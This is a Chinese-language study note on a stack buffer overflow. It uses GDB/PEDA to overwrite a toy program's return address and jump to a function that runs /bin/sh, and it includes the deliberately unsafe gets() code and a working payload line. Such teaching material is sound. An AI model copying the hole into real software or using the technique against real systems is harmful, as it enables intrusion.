> 此處需要用到 [PEDA](https://github.com/longld/peda) 這項 GDB 擴充

考慮以下程式 `bof.c`

```c
int evil() {
	system("/bin/sh");
}

int main() {
	char input[10];
	puts("Input:");
	gets(input);
	puts(input);
}
```


```shell
$ gcc -o bof -fno-stack-protector -g -no-pie bof.c
```
> 加上 `-fno-stack-protector` 以關閉 `CANNARY` 這個記憶體保護機制


# 執行結果觀測

```shell
$ gdb -q bof
(gdb) r
Input:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
```

```c
(gdb) x/16g input
0x7fffffffe470: 0x6161616161616161      0x6161616161616161
0x7fffffffe480: 0x6161616161616161      0x6161616161616161
0x7fffffffe490: 0x6161616161616161      0x6161616161616161
0x7fffffffe4a0: 0x6161616161616161      0x6161616161616161
0x7fffffffe4b0: 0x6161616161616161      0x0061616161616161
0x7fffffffe4c0: 0x00000000004004c0      0x00007fffffffe560
0x7fffffffe4d0: 0x0000000000000000      0x0000000000000000
0x7fffffffe4e0: 0x06fe5dce4008e824      0x06fe4d7426f8e824
```
-  `input` 這個區域變數是位於 `main` 函式的 stack 中。而位於 `stack` 最頂端的是函式的 `return address`
	- 可推測是輸入的 `a` 蓋到 `return address` 導致 `rip` 指到無法存取的地方



將中斷點下在 `main+53` 的位置，並觀察接下來 `rsp`，也就是位於 `return address`

```c
(gdb) pd main
Dump of assembler code for function main:
   0x00000000004005cc <+0>:     push   rbp
   0x00000000004005cd <+1>:     mov    rbp,rsp
   0x00000000004005d0 <+4>:     sub    rsp,0x10
   0x00000000004005d4 <+8>:     mov    edi,0x40069c
   0x00000000004005d9 <+13>:    call   0x400470 <puts@plt>
   0x00000000004005de <+18>:    lea    rax,[rbp-0x10]
   0x00000000004005e2 <+22>:    mov    rdi,rax
   0x00000000004005e5 <+25>:    mov    eax,0x0
   0x00000000004005ea <+30>:    call   0x4004a0 <gets@plt>
   0x00000000004005ef <+35>:    lea    rax,[rbp-0x10]
   0x00000000004005f3 <+39>:    mov    rdi,rax
   0x00000000004005f6 <+42>:    call   0x400470 <puts@plt>
   0x00000000004005fb <+47>:    mov    eax,0x0
   0x0000000000400600 <+52>:    leave
=> 0x0000000000400601 <+53>:    ret
End of assembler dump.

(gdb) b *0x0000000000400601
Breakpoint 1 at 0x400601: file bof.c, line 10.

(gdb) c
Continuing.

(gdb) p $rsp
$7 = (void *) 0x7fffffffe488

gdb-peda$ x/g 0x7fffffffe488
0x7fffffffe488: 0x6161616161616161
```
- `return address` 指向 `0x6161616161616161`

> vmmap需要裝plugin才能使用
```c
(gdb) vmmap
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /tmp/bof
0x00600000         0x00601000         r--p      /tmp/bof
0x00601000         0x00602000         rw-p      /tmp/bof
0x00602000         0x00623000         rw-p      [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fea000 0x00007ffff7fed000 rw-p      mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p      [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
```
- 使用 `vmmap` 可知 `0x6161616161616161` 並不屬於該程式可以存取之範圍，所以才會拋出 `Segmentation fault` 這樣的訊息
![[Pasted image 20231010173940.png]]


# Return to `evil()`

- 由以上的結果可以得知，我們可以做到讓rip指向任何我們要抵達的位置
```c
(gdb) p evil
$15 = {int ()} 0x4005b6 <evil>
```
> x86-64是以`little endian` 將值存放於記憶體中，因此我們必須先將 `0x4005b6` 轉換為 little endian 的表示法：`\xb6\x05@\x00\x00\x00\x00\x00`

- 輸入a-z字串以便計算return address的位置
```c
(gdb) r
Input:
abcdefghijklmnopqsttuvwxyzabcdefghijklmnop
abcdefghijklmnopqsttuvwxyzabcdefghijklmnop

Program received signal SIGSEGV, Segmentation fault.

(gdb) p $rsp
$3 = (void *) 0x7fffffffe488
(gdb) x/s 0x7fffffffe488
0x7fffffffe488: "yzabcdefghijklmnop"
```
- `$rsp` 的第一個字為 `y`
	- `y` 之前有 24 個字母，也就是我們需要填入 24 個值才碰的到 return address

```shell
$ echo -ne "aaaaaaaaaaaaaaaaaaaaaaaa\xb6\x05@\x00\x00\x00\x00\x00" > payload
$ ./bof < payload

Input:

aaaaaaaaaaaaaaaaaaaaaaaa▒@

pwd
/tmp
```

![[Pasted image 20231010174522.png]]

# [[ROP攻擊]]

#C語言 #函式 